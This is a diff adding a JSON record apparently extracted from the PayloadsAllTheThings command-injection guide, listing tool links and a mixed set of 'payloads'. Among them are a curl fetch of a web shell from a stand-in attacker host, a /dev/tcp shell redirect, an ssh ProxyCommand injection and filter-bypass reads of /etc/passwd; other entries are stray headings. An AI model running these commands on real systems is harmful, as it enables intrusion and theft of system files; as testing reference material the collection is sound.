@@ -1,0 +1,27 @@
+{
+  "id": "rce-e009f4dfd4da",
+  "category": "RCE",
+  "title": "README",
+  "description": "# Command Injection\n\n> Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [Basic Commands](#basic-commands)\n    * [Chaining Commands](#chaining-commands)\n    * [Argument Injection](#argument-injection)\n    * [Inside A Command](#inside-a-command)\n* [Filter Bypasses](#filter-bypasses)\n    * [Bypass Without Space](#bypass-without-space)\n    * [Bypass W",
+  "payloads": [
+    "* [Bypass With $@](#bypass-with-)",
+    "* [commixproject/commix](https://github.com/commixproject/commix) - Automated All-in-One OS command injection and exploitation tool",
+    "* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - An OOB interaction gathering server and client library",
+    "Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/) to find the argument to inject to gain command execution.",
+    "ssh '-oProxyCommand=\"touch /tmp/foo\"' foo@foo",
+    "Argument injection can be abused using the [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) technique.",
+    "$url = \"https://example.tld/\" . $_GET['path'] . \".txt\";",
+    "# -o, --output <file>        Write to file instead of stdout",
+    "curl http://evil.attacker.com/ -o webshell.php",
+    "* Input redirection. The < character tells the shell to read the contents of the file specified.",
+    "cat</etc/passwd",
+    "sh</dev/tcp/127.0.0.1/4242",
+    "swissky@crashlab:~$ echo ${HOME:0:1}",
+    "swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd",
+    "swissky@crashlab:~$ echo . | tr '!-0' '\"-1'"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Command Injection/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
